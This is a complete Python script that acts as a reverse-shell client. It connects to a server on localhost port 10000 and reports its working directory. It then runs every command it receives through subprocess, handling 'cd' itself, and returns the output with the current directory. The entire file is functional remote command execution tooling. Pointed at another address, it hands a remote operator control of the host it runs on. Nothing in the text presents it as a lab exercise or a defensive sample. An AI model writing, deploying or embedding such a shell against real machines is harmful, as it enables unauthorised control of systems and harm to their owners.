import socket
import os
import subprocess

def main():
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect the socket to the server
    server_address = ('localhost', 10000)
    print(f'connecting to {server_address}')
    sock.connect(server_address)

    # Send working directory to server
    wd = os.getcwd()
    sock.sendall(wd.encode())

    while True:
        # Receive data
        cmd = sock.recv(1024).decode()
        if cmd == "exit":
            break

        sliced_cmd = cmd.split()
        
        

        if sliced_cmd[0] == "cd":
            try:
                
                os.chdir(''.join(sliced_cmd[1]))
                
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        
        else:
            # Other commands
            output = subprocess.getoutput(cmd)
            

                        
        cwd = os.getcwd()
        send = f"{output}|{cwd}"
        sock.send(send.encode())

    
        
        print(f'received {cmd}')
    sock.close()

        
        # Clean up the connection
        #sock.close()


if __name__ == "__main__":
    main()